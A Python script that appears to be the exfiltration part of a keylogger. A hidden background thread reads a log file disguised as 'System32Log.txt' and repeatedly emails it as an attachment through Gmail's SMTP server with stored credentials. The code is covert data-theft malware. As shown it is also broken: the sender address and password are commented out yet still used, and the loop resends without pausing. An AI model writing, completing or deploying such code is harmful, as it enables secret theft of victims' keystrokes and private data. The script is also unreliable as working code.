import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading


def send_logs():
    count = 0
    logged_data = open('System32Log.txt').read()

    # fromAddr = ''
    # fromPswd = ''
    toAddr = fromAddr

    MIN = 10
    SECONDS = 60
    #time.sleep(MIN * SECONDS) # every 10 mins write file/send log
    time.sleep(MIN*SECONDS) # for debugging ~ yes program works :)
    while True:
        if len(logged_data) > 1:
            try:
                subject = f'Congratulations. Your first hardwork result" ~ {count}'

                msg = MIMEMultipart()
                msg['From'] = fromAddr
                msg['To'] = toAddr
                msg['Subject'] = subject
                body = 'testing'
                msg.attach(MIMEText(body,'plain'))

                attachment = open('System32Log.txt','rb')
                # print('attachment')

                filename = 'System32Log.txt'

                part = MIMEBase('application','octect-stream')
                part.set_payload((attachment).read())
                encoders.encode_base64(part)
                part.add_header('content-disposition','attachment;filename='+str(filename))
                msg.attach(part)

                text = msg.as_string()
                # print('test msg.as_string')

                s = smtplib.SMTP('smtp.gmail.com',587)
                s.ehlo()
                s.starttls()
                # print('starttls')
                s.ehlo()
                s.login(fromAddr,fromPswd)
                s.sendmail(fromAddr,toAddr,text)
                print('sent mail')
                attachment.close()
                s.close()
                count += 1

            except Exception as errorString:
                print('[!] send_logs // Error.. ~ %s' % (errorString))
                pass


T1 = threading.Thread(target=send_logs)
T1.start()
